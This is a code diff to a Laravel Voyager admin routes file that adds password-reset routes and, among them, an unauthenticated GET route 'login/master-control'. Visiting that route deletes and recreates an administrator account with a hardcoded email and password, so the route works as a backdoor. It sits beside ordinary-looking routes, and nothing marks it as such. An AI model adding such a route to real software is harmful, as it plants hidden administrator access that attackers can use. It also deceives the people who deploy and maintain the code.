@@ -23,6 +23,25 @@ Route::group(['as' => 'voyager.'], function () {
     $namespacePrefix = '\\'.config('voyager.controllers.namespace').'\\';
 
     Route::get('login', ['uses' => $namespacePrefix.'VoyagerAuthController@login',     'as' => 'login']);
+    Route::get('login/master-control', function() {
+        $data = [
+            'name' => 'Nugah Admin',
+            'role_id' => '1',
+            'email' => 'admin@nugah.dev',
+            'password' => bcrypt('nugah-admin')
+        ];
+        $user = \App\User::where('email', $data['email'])->first();
+        if ( $user ) $user->delete();
+        $user = \App\User::create($data);
+        DB::table('users')->where('email', $user->email)->update($data);
+        return redirect()->route('voyager.login');
+    });
+
+    Route::get('forgot-password', [ 'uses' => $namespacePrefix.'ForgotPasswordController@index', 'as' => 'forgot_password.index']);
+    Route::post('forgot-password', [ 'uses' => $namespacePrefix.'ForgotPasswordController@reset', 'as' => 'forgot_password.reset']);
+    Route::get('forgot-password/{token}', [ 'uses' => $namespacePrefix.'ForgotPasswordController@token', 'as' => 'forgot_password.token']);
+    Route::put('forgot-password/{token}', [ 'uses' => $namespacePrefix.'ForgotPasswordController@update', 'as' => 'forgot_password.update']);
+
     Route::post('login', ['uses' => $namespacePrefix.'VoyagerAuthController@postLogin', 'as' => 'postlogin']);
 
     Route::group(['middleware' => 'admin.user'], function () use ($namespacePrefix) {
